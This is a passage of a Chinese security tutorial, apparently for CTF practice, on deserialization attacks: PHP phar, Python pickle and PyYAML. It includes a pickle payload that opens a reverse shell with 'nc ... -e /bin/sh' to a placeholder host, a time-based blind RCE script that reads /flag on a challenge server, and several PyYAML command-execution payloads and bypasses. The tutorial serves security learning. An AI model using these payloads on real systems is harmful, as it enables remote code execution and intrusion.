punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">" &lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub，增加gif文件头</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h2><p>如果已经有os模块，就可以直接使用：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">genpoc</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""echo test >poc.txt"""</span>  <span class="token comment"># 要执行的命令</span>        <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span>        <span class="token comment"># reduce函数必须返回元组或字符串</span>e <span class="token operator">=</span> genpoc<span class="token punctuation">(</span><span class="token punctuation">)</span>poc <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span> <span class="token comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("nc vpsip vps-port -e /bin/sh").read()'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token operator">=</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span>test<span class="token operator">=</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解法二：<br>rce盲注</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64result <span class="token operator">=</span> <span class="token string">""</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"_-&#123;&#125;"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits  <span class="token comment"># 大小写字母和数字</span>url <span class="token operator">=</span> <span class="token string">"http://5f450fc6-b18e-4fdd-a5b5-904c4354842e.challenge.ctf.show/backdoor?data="</span>payload <span class="token operator">=</span> <span class="token string">"__import__('os').popen('if [ `cat /flag|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 5;fi').read()"</span><span class="token keyword">class</span> <span class="token class-name">Rce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>code <span class="token operator">=</span> payload    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print(self.code)</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>code<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>length <span class="token operator">=</span> <span class="token number">50</span>  <span class="token comment"># length长度</span>key <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        rser <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>Rce<span class="token punctuation">(</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        target <span class="token operator">=</span> url <span class="token operator">+</span> rser        <span class="token comment"># print(target)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">4.5</span><span class="token punctuation">,</span><span class="token number">4.5</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> result <span class="token operator">+</span> n            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token comment">#ctfshow&#123;6f6c83e4-f049-4y63-82d9-533874c9a14a&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Yaml反序列化（python）"><a href="#Yaml反序列化（python）" class="headerlink" title="Yaml反序列化（python）"></a>Yaml反序列化（python）</h2><p> <a href="https://pyyaml.org/wiki/PyYAMLDocumentation">https://pyyaml.org/wiki/PyYAMLDocumentation</a> (YAML官方文档)</p><h3 id="基础语法规则"><a href="#基础语法规则" class="headerlink" title="基础语法规则"></a>基础语法规则</h3><p>基础语法规则有以下几种：</p><ol><li>一个 .yml 文件中可以有多份配置文件，用 <code>---</code> 隔开即可</li><li>对大小写敏感</li><li>YAML 中的值，可使用 json 格式的数据</li><li>使用<strong>缩进表示层级关系</strong></li><li>缩进时不允许使用 tab（<code>\t</code>），<strong>只允许使用空格</strong>。</li><li>缩进的<strong>空格数目不重要，只要相同层级的元素左侧对齐即可</strong>。</li><li><strong><code>#</code> 表示注释，和 Python 一样</strong></li><li><strong><code>!!</code> 表示强制类型装换</strong></li><li>可以通过 <strong><code>&amp;</code> 来定义锚点，使用 <code>*</code> 来引用锚点。<code>*</code> 也可以和 <code>&lt;&lt;</code> 配合，引用时会自动展开对象，类似 Python 的 <code>**dict()</code></strong></li><li>YAML 支持的数据结构有三种<ol><li>对象：键值对的集合</li><li>列表：一组按次序排列的值</li><li>标量（scalars）：原子值（不可再拆分），例如 数字、日期等等</li></ol></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yamlyaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''string_0:    - macr0phag3    - "I'm Tr0y"  # 可以使用双引号或者单引号包裹特殊字符    - "I am fine. \u263A" # 使用双引号包裹时支持 Unicode 编码    - "\\x0d\\x0a is \\r\\n" # 使用双引号包裹时还支持 Hex 编码    - newline      newline2  # 字符串可以拆成多行，每行之间用空格隔开# > 可以在字符串中折叠换行string_1: >    newline    newline2# | 保留换行符string_2: |    newline    newline2# | 保留换行符，且去掉最后一个换行符string_3: |-    newline    newline2list: &amp;id_1- 18  # 定义锚点- cmtwo_dimensional_list:-    - Macr0phag3    - Tr0yboolean:     - TRUE  # true、True、Yes、YES、yes、ON、on、On 都可以    - FALSE  # false、False、NO、no、No、off、OFF、Off 都可以float:    - 3.14    - 6.8523015e+5  # 可以使用科学计数法int:    - 123    - 0b10100111010010101110  # 支持二进制表示    - 0x0a  # 支持十六进制表示nulls:  - null  # NULL 也 ok  - Null  - ~  -date:    - 2018-02-17  # 日期必须使用 ISO 8601 格式，即 yyyy-MM-dddatetime:     -  2018-02-17T15:02:31+08:00  # 时间使用 ISO 8601 格式，时间和日期之间使用 T 连接，最后使用 + 代表时区# > 可以在字符串中折叠换行object: &amp;id_2    name: Tr0y    money: 0json: [&#123;1: Macr0phag3, 2: Tr0y&#125;, "???"]  # 值支持 jsonreference:     size: *id_1    &lt;&lt;: *id_2'''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="http://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8d42331c-e3bd-4620-af91-f6c797f8117e.png!blog" alt="img"> </p><h3 id="可以通过-来进行类型转换"><a href="#可以通过-来进行类型转换" class="headerlink" title="可以通过 !! 来进行类型转换"></a>可以通过 <code>!!</code> 来进行类型转换</h3><p> 如果我们想把数字类型变为字符串类型就可以这样：<code>a: !!str 1</code>，它的结果和 <code>a: &quot;1&quot;</code> 是一样的 </p><p> <img src="http://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8dbaf2fa-14ae-4c61-aac4-af1c0a04fd5c.png!blog" alt="img"> </p><p>对于一个 <code>!!x x</code> 来说，类型转换执行的伪代码就是：<code>find_function(&quot;x&quot;)(x)</code>。这个也很好理解。 </p><h3 id="高级类型转换"><a href="#高级类型转换" class="headerlink" title="高级类型转换"></a>高级类型转换</h3><p>在理解了基础的类型转换之后，查看源码可以发现还有一个 <code>add_multi_constructor</code> 函数，一共有 5 个：</p><ul><li><code>python/name</code></li><li><code>python/module</code></li><li><code>python/object</code></li><li><code>python/object/new</code></li><li><code>python/object/apply</code></li></ul><p>从上面那张图可以看到，这几个都可以引入新的模块。这就是 PyYAML 存在反序列化的本质原因。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p> 下面按照利用难度从易到难排列。 </p><h3 id="版本小于-5-1"><a href="#版本小于-5-1" class="headerlink" title="版本小于 5.1"></a>版本小于 5.1</h3><p>下面以 <code>4.2b4</code> 为例。</p><h4 id="关键方法"><a href="#关键方法" class="headerlink" title="关键方法"></a>关键方法</h4><p>&lt;5.1 版本中提供了几个方法用于解析 YAML：</p><ol><li><code>yaml.load</code>：加载单个 YAML 配置</li><li><code>yaml.load_all</code>：加载多个 YAML 配置</li></ol><p>以上这两种均可以通过 <code>Loader</code> 参数来指定加载器。一共有三个加载器，加载器后面对应了三个不同的构造器：</p><ol><li><code>BaseConstructor</code>：最最基础的构造器，不支持强制类型转换</li><li><code>SafeConstructor</code>：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改</li><li><code>Constructor</code>：在 YAML 规范上新增了很多强制类型转换</li></ol><p><code>Constructor</code> 这个是最危险的构造器，却是默认使用的构造器。</p><h4 id="python-x2F-object-x2F-apply"><a href="#python-x2F-object-x2F-apply" class="headerlink" title="python&#x2F;object&#x2F;apply"></a>python&#x2F;object&#x2F;apply</h4><p>对应的函数是 <code>construct_python_object_apply</code>，最终在 <code>make_python_instance</code> 中引入了模块中的方法并执行。</p><p><code>python/object/apply</code> 要求参数必须用一个列表的形式提供，所以以下 payload 都是等价的，但是写法不一样，可以用来绕过：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'exp: !!python/object/apply:os.system ["whoami"]'</span><span class="token punctuation">)</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"exp: !!python/object/apply:os.system ['whoami']"</span><span class="token punctuation">)</span><span class="token comment"># 引号当然不是必须的</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"exp: !!python/object/apply:os.system [whoami]"</span><span class="token punctuation">)</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""exp: !!python/object/apply:os.system- whoami"""</span><span class="token punctuation">)</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""exp: !!python/object/apply:os.system  args: ["whoami"]"""</span><span class="token punctuation">)</span><span class="token comment"># command 是 os.system 的参数名</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""exp: !!python/object/apply:os.system  kwds: &#123;"command": "whoami"&#125;"""</span><span class="token punctuation">)</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"!!python/object/apply:os.system [whoami]: exp"</span><span class="token punctuation">)</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"!!python/object/apply:os.system [whoami]"</span><span class="token punctuation">)</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""!!python/object/apply:os.system- whoami"""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="python-x2F-object-x2F-new"><a href="#python-x2F-object-x2F-new" class="headerlink" title="python&#x2F;object&#x2F;new"></a>python&#x2F;object&#x2F;new</h4><p>对应的函数是 <code>construct_python_object_new</code>，这个函数仅有一行，就是调用 <code>construct_python_object_apply</code>，他们两个链路的区别在于调用 <code>make_python_instance</code> 时 <code>newobj</code> 参数不同。</p><p>而仔细观察 <code>make_python_instance</code> 中的 <code>if newobj and isinstance(cls, type)</code> 条件基本上都会满足（有例外，后面那个条件有点特殊的地方，下面会细说）。所以 <strong><code>python/object/new</code> 和 <code>python/object/apply</code> 可以视为是完全等价的，那么它们的 payload 就是一样的，参考上面即可。</strong></p><h4 id="python-x2F-object"><a href="#python-x2F-object" class="headerlink" title="python&#x2F;object"></a>python&#x2F;object</h4><p>对应的函数是 <code>construct_python_object</code>，非常简单，先 <code>make_python_instance</code> 了一下，然后执行了 <code>set_python_instance_state</code>。根据上面的经验，只要走到 <code>make_python_instance</code> 就可以触发调用。但问题是这里没法传参，<strong>所以只能执行无参函数</strong>：</p><p><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/e46d6374-5b1d-496b-8226-9ae96eae7205.png!blog"><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/e46d6374-5b1d-496b-8226-9ae96eae7205.png!blog" alt="img"></a></p><p>有趣的是，这种利用方式会报错：<code>TypeError: can&#39;t set attributes of built-in/extension type &#39;object&#39;</code>，通过分析代码可知，流程是走到了 <code>setattr(object, key, value)</code> 报错的：</p><p><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/e69c4ea6-e8bd-4fce-b8c2-1dcd202b9eeb.png!blog"><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/e69c4ea6-e8bd-4fce-b8c2-1dcd202b9eeb.png!blog" alt="img"></a></p><p>这个是必然的，object 这种内置的类，都是在底层的 C 代码中写死的，官方不允许对它们随便设置属性的。这里顺便说一句，通过 gc 引用是可以修改的：</p><p><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/bc3913c2-af44-4094-8f66-7b122787151d.png!blog"><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/bc3913c2-af44-4094-8f66-7b122787151d.png!blog" alt="img"></a></p><p>当然这个不是本文重点。</p><p>所以这很明显是一个 bug，因为这个流程既然存在就必定会走到，而现在一旦走到就必然报错。查了下 issue，发现在 18 年的时候就已经发现了：</p><p><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/c4647a3e-2d2b-4604-8113-6fc798175a93.png!blog"><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/c4647a3e-2d2b-4604-8113-6fc798175a93.png!blog" alt="img"></a></p><p>的确，应该是 <strong><code>setattr(instance, key, value)</code>。这个 bug 在 5.3 已修复了</strong>。</p><h4 id="python-x2F-module"><a href="#python-x2F-module" class="headerlink" title="python&#x2F;module"></a>python&#x2F;module</h4><p>对应的函数是 <code>construct_python_module</code>，里面**调用了 <code>find_python_module</code>，等价于 <code>import</code>**。</p><p>那么在这种没有调用逻辑的情况下，是否有办法利用呢？我感觉在可以写任意文件的时候是有办法的。比如搭配任意文件上传。</p><p>首先写入执行目录，yaml 中指定同名模块，例如上传一段恶意代码，叫 <code>exp.py</code>，然后通过 <code>yaml.load(&#39;!!python/module:exp&#39;)</code> 加载。</p><p>在实际的场景中，由于<strong>一般用于存放上传文件的目录和执行目录并不是同一个</strong>，例如：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">app.pyuploads  <span class="token punctuation">|</span>_ user.png  <span class="token punctuation">|</span>_ header.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个时候只需要上传一个 .py 文件，这个文件会被放在 uploads 下，这时只需要触发 <code>import uploads.header</code> 就可以利用了：</p><p><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/a2aa2bd6-27cc-4d0c-aa6a-4b894ae35514.png!blog#width-zoom6"><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/a2aa2bd6-27cc-4d0c-aa6a-4b894ae35514.png!blog#width-zoom6" alt="img"></a></p><p>更简单的，<strong>直接上传 <code>__init__.py</code>，在触发的时候用 <code>!!python/module:uploads</code> 就可以了</strong>。</p><h4 id="python-x2F-name"><a href="#python-x2F-name" class="headerlink" title="python&#x2F;name"></a>python&#x2F;name</h4><p>对应的函数是 <code>construct_python_name</code>，里面调用了 <code>find_python_name</code>，与 <code>python/module</code> 的逻辑极其类似，区别在于，**<code>python/module</code> 仅仅返回模块而 <code>python/name</code> 返回的是模块下面的属性&#x2F;方法**。</p><p>利用的逻辑除了上面一样之外（写文件），还可以用于这种场景：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yamlTOKEN <span class="token operator">=</span> <span class="token string">"Y0u_Nev3r_kn0w."</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        token <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        token <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">if</span> token <span class="token operator">==</span> TOKEN<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"yes, master."</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"fuck off!"</span><span class="token punctuation">)</span>config <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment"># 可控输入点</span>check<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个时候的 payload 为 <code>token: !!python/name:__main__.TOKEN</code>，<strong>无需知道 TOKEN 是什么，但是需要知道变量名</strong>。</p><p>当然，这个场景除了 <code>!!python/module</code> 无法完成利用之外，上述其他姿势都可以实现。</p><h3 id="版本大于等于-5-1"><a href="#版本大于等于-5-1" class="headerlink" title="版本大于等于 5.1"></a>版本大于等于 5.1</h3><p>由于默认的构造器太过强大，开发人员不了解这些危险很容易中招。所以 PyYAML 的开发者就将构造器分为：</p><ol><li><code>BaseConstructor</code>：没有任何强制类型转换</li><li><code>SafeConstructor</code>：<strong>只有基础类型的强制类型转换</strong></li><li><code>FullConstructor</code>：<strong>除了 <code>python/object/apply</code> 之外都支持，但是加载的模块必须位于 <code>sys.modules</code> 中</strong>（<strong>说明已经主动 import 过了才让加载</strong>）。这个是<strong>默认的构造器</strong>。</li><li><code>UnsafeConstructor</code>：<strong>支持全部的强制类型转换</strong></li><li><code>Constructor</code>：等同于 <code>UnsafeConstructor</code></li></ol><p>对应顶层的方法新增了：</p><ol><li><code>yaml.full_load</code></li><li><code>yaml.full_load_all</code></li><li><code>yaml.unsafe_load</code></li><li><code>yaml.unsafe_load_all</code></li></ol><p>通常情况下，我们还是会使用 <code>yaml.load</code>，这个时候会有 warning：</p><p><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/74750255-05b5-44fe-89fa-56f84fff1b78.png!blog"><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/74750255-05b5-44fe-89fa-56f84fff1b78.png!blog" alt="img"></a></p><p>因为在不指定 <code>Loader</code> 的时候，<strong>默认是 <code>FullConstructor</code> 构造器</strong>。这对开发人员起到了提醒的作用。</p><p>除此之外，在 <code>make_python_instance</code> 还新增的额外的限制：<code>if not (unsafe or isinstance(cls, type))</code>，也就是说，在安全模式下，加载进来的 <code>module.name</code> 必须是一个类（例如 <code>int</code>、<code>str</code> 之类的），否则就会报错。</p><h4 id="常规利用方式"><a href="#常规利用方式" class="headerlink" title="常规利用方式"></a>常规利用方式</h4><p>常规的利用方式和 &lt;5.1 版本的姿势是一样的。当然前提是构造器必须用的是 **<code>UnsafeConstructor</code> 或者 <code>Constructor</code>**，也就是这种情况：</p><ol><li><code>yaml.unsafe_load(exp)</code></li><li><code>yaml.unsafe_load_all(exp)</code></li><li><code>yaml.load(exp, Loader=UnsafeLoader)</code></li><li><code>yaml.load(exp, Loader=Loader)</code></li><li><code>yaml.load_all(exp, Loader=UnsafeLoader)</code></li><li><code>yaml.load_all(exp, Loader=Loader)</code></li></ol><p>直接打就好了。</p><h4 id="突破-FullConstructor"><a href="#突破-FullConstructor" class="headerlink" title="突破 FullConstructor"></a>突破 FullConstructor</h4><p>FullConstructor 中，限制了只允许加载 <code>sys.modules</code> 中的模块。这个有办法突破吗？我们先列举一下限制：</p><ol><li>只引用，不执行的限制：<ol><li>加载进来的 <code>module</code> 必须是位于 <code>sys.modules</code> 中</li></ol></li><li>引用并执行：<ol><li>加载进来的 <code>module</code> 必须是位于 <code>sys.modules</code> 中</li><li>FullConstructor 下，<code>unsafe = False</code>，加载进来的 <strong><code>module.name</code> 必须是一个类</strong></li></ol></li></ol><p><strong>举两个不行的例子：</strong></p><ol><li><code>!!python/name:pickle.loads</code>：<code>pickle</code> 不在 <code>sys.modules</code> 中</li><li><code>!!python/object/new:builtins.eval [&quot;print(1)&quot;]</code>：<code>eval</code> 虽然在 <code>sys.modules</code> 中，但是 <code>type(builtins.eval)</code> 是 <code>builtin_function_or_method</code> 而不是一个类。</li></ol><p>那么最直接的思路就是，有没有一个模块，它在 **FullConstructor 上下文中的 <code>sys.modules</code> 里，同时它还有一个类，这个类可以执行命令？答案就是 <code>subprocess.Popen</code>**。所以最简单的 payload 就是：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""!!python/object/apply:subprocess.Popen  - whoami"""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>不用 <code>!!python/object/apply</code> 的话，也有其他办法。</p><p>通过<strong>遍历 builtins 下的所有方法</strong>，可以找到这些看起来有点用的：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">bool</span>、<span class="token builtin">bytearray</span>、<span class="token builtin">bytes</span><span class="token builtin">complex</span><span class="token builtin">dict</span><span class="token builtin">enumerate</span><span class="token builtin">filter</span>、<span class="token builtin">float</span>、<span class="token builtin">frozenset</span><span class="token builtin">int</span><span class="token builtin">list</span><span class="token builtin">map</span>、<span class="token builtin">memoryview</span><span class="token builtin">object</span><span class="token builtin">range</span>、<span class="token builtin">reversed</span><span class="token builtin">set</span>、<span class="token builtin">slice</span>、<span class="token builtin">str</span>、<span class="token builtin">staticmethod</span><span class="token builtin">tuple</span><span class="token builtin">zip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，<code>map</code> 是可以用来触发函数执行的，那么函数怎么引用进来呢？很明显就是 <code>python/name</code>，所以这个 payload 的原型就可以是：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>翻译为 YAML 即为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""!!python/object/new:tuple- !!python/object/new:map  - !!python/name:eval  - ["__import__('os').system('whoami')"]"""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有个非常有趣的地方，如果<strong>把 <code>tuple</code> 换成 <code>list</code> 或者是 <code>set</code>，</strong>理论上同样会解开 map 里的内容：</p><p><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/342671db-24bb-431c-9a4e-2ce809fc71b6.png!blog"><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/342671db-24bb-431c-9a4e-2ce809fc71b6.png!blog" alt="img"></a></p><p>但是通过 <strong><code>!!python/object/new</code> 来使用时却会忽略参数</strong>，生成一个空的迭代对象：</p><p><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/dae3bf71-db1c-4962-aea3-195cbc1f5dd8.png!blog#width-zoom5"><img 